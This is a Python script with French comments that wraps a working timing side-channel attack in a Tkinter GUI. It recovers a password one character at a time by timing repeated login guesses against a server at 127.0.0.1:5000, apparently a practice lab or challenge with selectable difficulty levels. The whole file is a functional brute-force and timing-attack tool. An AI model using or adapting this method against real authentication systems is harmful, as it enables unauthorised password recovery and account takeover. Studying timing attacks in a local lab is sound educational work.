import requests
import string
import time
import tkinter as tk
from tkinter import ttk
from numpy import mean
import threading

class TimingAttackGUI:
    """Interface graphique pour une attaque par temporisation sur un mot de passe."""
    # Ensemble de caractères possibles pour le mot de passe
    car = string.ascii_letters + string.digits

    def __init__(self, level: str = '0', occ: int = 1, password: str = ''):
        self.level = level
        self.occ = occ
        self.password = password
        self.last_time = len(password) * 17
        self.password_len = 0
        self.url = "http://127.0.0.1:5000"
        self.running = False
        
        # Initialisation de l'interface graphique
        self.root = tk.Tk()
        self.root.title("Timing Attack")
        self.root.geometry("600x400")
        
        # Frame principale
        self.main_frame = ttk.Frame(self.root, padding="10")
        self.main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        # Labels pour afficher les informations
        self.password_label = ttk.Label(self.main_frame, text="Mot de passe actuel: ")
        self.password_label.grid(row=0, column=0, pady=15)
        
        self.current_try_label = ttk.Label(self.main_frame, text="Test actuel: ")
        self.current_try_label.grid(row=1, column=0, pady=0)
        
        self.time_label = ttk.Label(self.main_frame, text="Temps: 0ms")
        self.time_label.grid(row=2, column=0, pady=0)
        
        self.max_time_label = ttk.Label(self.main_frame, text="Lettre avec max temps: ")
        self.max_time_label.grid(row=3, column=0, pady=15)
        
        self.mean_time_label = ttk.Label(self.main_frame, text="Moyenne des temps: ")
        self.mean_time_label.grid(row=4, column=0, pady=5)
        
        # Bouton de démarrage
        self.start_button = ttk.Button(self.main_frame, text="Démarrer", command=self.start_attack)
        self.start_button.grid(row=5, column=0, pady=15)
        
        # Zone de log
        self.log_text = tk.Text(self.main_frame, height=10, width=70)
        self.log_text.grid(row=6, column=0, pady=10)
        
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
    
    def log(self, message):
        self.log_text.insert(tk.END, message + "\n")
        self.log_text.see(tk.END)

    def request_level(self, level: str):
        good = False
        while not good:
            json = {"level": level}
            response = requests.post(url=self.url + '/level', json=json, verify=False)
            if response.status_code == 200 and response.json().get('result', False):
                self.log(f'Level set: {level}')
                good = True
                return
            else:
                self.log(f'Erreur : {response.status_code} : {response.text}')
            time.sleep(0.5)

    def request_pwd(self, letter: str):
        json = {"password": (self.password + letter).ljust(self.password_len, '0')}
        self.current_try_label.config(text=f"Test actuel: {json.get('password')}")
        self.root.update()
        
        response = requests.post(url=self.url + '/check', json=json, verify=False)
        if response.status_code == 200 or response.json()['result']:
            if response.json()['result']['Valid']:
                self.log(f'\nLe mot de passe est: {self.password + letter}')
                return None
            time = int(response.json()['result']['time'])
            self.time_label.config(text=f"Temps: {time}ms")
            return time
        else:
            self.log(f'Erreur : {response.status_code} : {response.text}')
            return None

    def brute_force_len_password(self):
        while self.request_pwd('') == 0:
            self.password_len += 1
        self.log(f'Longueur password: {self.password_len}\n')

    def max_time(self, temps: list[int]) -> int | None:
        i = temps.index(max(temps))
        tmp_mean = mean((temps[:i] + temps[i+1:]) or [0])
        self.mean_time_label.config(text=f"Moyenne des temps: {tmp_mean}")
        if len(temps) < 4:
            return None
        if temps[i] > tmp_mean + 15:
            return i

    def brute_force_char(self):
        time_list = []
        for letter in self.car:
            if not self.running:
                return None
            time_letter = []

            # Test chaque lettre un nombre occ de fois
            for _ in range(self.occ):
                time_letter_in_test = -1

                # Gère les erreurs de temps
                while time_letter_in_test < self.last_time:
                    time_letter_in_test = self.request_pwd(letter)
                    if time_letter_in_test is None:
                        # Mot de passe valide
                        return None
                    print(self.password + letter, time_letter_in_test)
                
                time_letter.append(time_letter_in_test)
            
            # Récupère la moyenne de temps de la lettre
            time_list.append(mean(time_letter))
            self.max_time_label.config(text=f"Lettre avec max temps: {self.car[time_list.index(max(time_list))]} ({max(time_list)}ms)")
            
            index = self.max_time(time_list)
            if index is not None:
                # Si une lettre a un timing plus élevé significativement
                break
        
        self.password += self.car[time_list.index(max(time_list))]
        self.last_time = max(time_list) - 15
        self.password_label.config(text=f"Mot de passe actuel: {self.password}")
        self.log(f'Nouveau last_time: {self.last_time}')
        return True

    def brute_force_password(self):
        self.running = True
        self.request_level(self.level)
        self.brute_force_len_password()
        
        while self.running and self.brute_force_char():
            self.log(f'Le mot de passe commence par: {self.password}')
        
        if self.running:
            self.log("Attaque terminée!")
        else:
            self.log("Attaque arrêtée par l'utilisateur")

    def start_attack(self):
        self.start_button.config(state='disabled')
        thread = threading.Thread(target=self.brute_force_password)
        thread.start()

    def on_closing(self):
        self.running = False
        self.root.quit()

    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    niveau = '2'
    occurrence = 4
    password = ''

    app = TimingAttackGUI(level=niveau, occ=occurrence, password=password)
    app.run()